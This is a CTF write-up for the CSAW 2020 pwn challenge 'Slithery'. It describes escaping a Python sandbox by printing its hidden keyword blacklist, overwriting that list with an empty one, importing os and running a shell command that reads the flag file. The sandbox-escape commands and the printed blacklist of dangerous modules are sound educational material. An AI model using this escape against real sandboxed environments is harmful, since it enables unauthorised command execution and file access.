# CSAW 2020 Qualifiers : Slithery 
> **Category**: Pwn **Points**:100 **Description**:

Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...

`nc pwn.chal.csaw.io 5011`

[sandbox.py](/csaw20/pwn/slithery/sandbox.py)

### Solution:

Connect to the nc address, you are prompted with a python interpreter <br>
```
EduPy 3.8.2
>>>
```

Run some python commands, produces `Exception: not allowed!!` as output.

Thus, all the common python cmds are blacklisted.<br>

Look through sandbox.py<br>
```python
import blacklist  # you don't get to see this :p
```

```python
while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]):
                raise Exception("not allowed!!")
```

A custom blacklist is used which we don't have access to or do we ?<br>
`help` and `print` weren't blacklisted<br>

```
>> help(blacklist)
Help on module blacklist:

NAME
    blacklist - blacklist.py

DESCRIPTION
        Module that is seperated and kept secret, as it contains all the banned keywords
        that cannot be executed in the sandbox.

DATA
    BLACKLIST = ['__builtins__', '__import__', 'eval', 'exec', 'import', '...
    BLACKLIST2 = ['eval', 'exec', 'import', 'from', 'timeit', 'base64comma...

FILE
    /home/slithery/blacklist.py

>> print(blacklist.BLACKLIST)
['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```

Can we bypass this blacklist ? There are many ways but I found a easier approach<br>
You could just completely change or empty the blacklist, so we are no longer restricted<br>

```
>> blacklist.BLACKLIST = []
>> import os # now works
```

Now enumerate and find the flag<br>

```
>> import os
>> os.system('cat /home/slithery/flag.txt')
```

### Flag
flag{y4_sl1th3r3d_0ut}




 

